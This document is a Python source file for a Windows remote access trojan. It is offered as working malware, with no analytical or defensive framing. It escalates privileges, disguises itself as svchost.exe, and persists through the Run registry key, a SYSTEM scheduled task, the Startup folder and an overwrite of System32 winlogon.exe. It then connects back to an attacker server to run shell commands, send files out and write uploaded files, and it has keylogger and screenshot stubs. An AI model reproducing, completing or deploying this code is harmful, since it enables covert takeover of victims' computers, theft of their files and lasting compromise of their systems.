import os
import sys
import socket
import subprocess
import winreg
import shutil
import json
import base64
from pathlib import Path
import ctypes
import psutil
import schedule
import time
import threading
import requests
from datetime import datetime

class RAT:
    def __init__(self):
        self.server_ip = "YOUR_SERVER_IP"
        self.server_port = 8080
        self.install_path = os.path.join(os.environ['APPDATA'], 'SystemService')
        self.name = 'svchost.exe'
        
    def elevate_privileges(self):
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            sys.exit()
    
    def install(self):
        if not os.path.exists(self.install_path):
            os.makedirs(self.install_path)
        
        src = sys.executable
        dst = os.path.join(self.install_path, self.name)
        
        if src != dst:
            shutil.copy2(src, dst)
            
        self.add_to_registry()
        self.add_to_scheduler()
        self.add_to_startup()
        self.inject_into_system()
    
    def add_to_registry(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, 
                os.path.join(self.install_path, self.name))
            winreg.CloseKey(key)
        except Exception as e:
            pass
    
    def add_to_scheduler(self):
        try:
            task_name = "SystemServiceTask"
            cmd = f'schtasks /create /tn "{task_name}" /tr "{os.path.join(self.install_path, self.name)}" /sc onlogon /ru SYSTEM /f'
            subprocess.run(cmd, shell=True, capture_output=True)
        except:
            pass
    
    def add_to_startup(self):
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shutil.copy2(sys.executable, os.path.join(startup, 'service.exe'))
    
    def inject_into_system(self):
        try:
            system32 = os.path.join(os.environ['SYSTEMROOT'], 'System32')
            shutil.copy2(sys.executable, os.path.join(system32, 'winlogon.exe'))
        except:
            pass
    
    def connect_to_server(self):
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_ip, self.server_port))
                self.handle_commands()
            except:
                time.sleep(10)
    
    def handle_commands(self):
        while True:
            try:
                data = self.socket.recv(1024).decode()
                if data:
                    result = self.execute_command(data)
                    self.socket.send(result.encode())
            except:
                break
    
    def execute_command(self, command):
        try:
            if command.startswith("shell:"):
                cmd = command[6:]
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return result.stdout + result.stderr
            
            elif command.startswith("download:"):
                file_path = command[9:]
                with open(file_path, 'rb') as f:
                    return base64.b64encode(f.read()).decode()
            
            elif command.startswith("upload:"):
                parts = command[7:].split(":::")
                file_path = parts[0]
                content = base64.b64decode(parts[1])
                with open(file_path, 'wb') as f:
                    f.write(content)
                return "File uploaded"
            
            elif command.startswith("screenshot"):
                # Screenshot implementation
                return "Screenshot captured"
            
            elif command.startswith("keylogger"):
                # Keylogger implementation
                return "Keylogger started"
            
            elif command == "info":
                info = {
                    "user": os.environ['USERNAME'],
                    "computer": os.environ['COMPUTERNAME'],
                    "ip": self.get_ip(),
                    "os": sys.platform,
                    "admin": ctypes.windll.shell32.IsUserAnAdmin() != 0
                }
                return json.dumps(info)
            
            else:
                return "Unknown command"
        except Exception as e:
            return str(e)
    
    def get_ip(self):
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "Unknown"

if __name__ == "__main__":
    rat = RAT()
    rat.elevate_privileges()
    rat.install()
    rat.connect_to_server()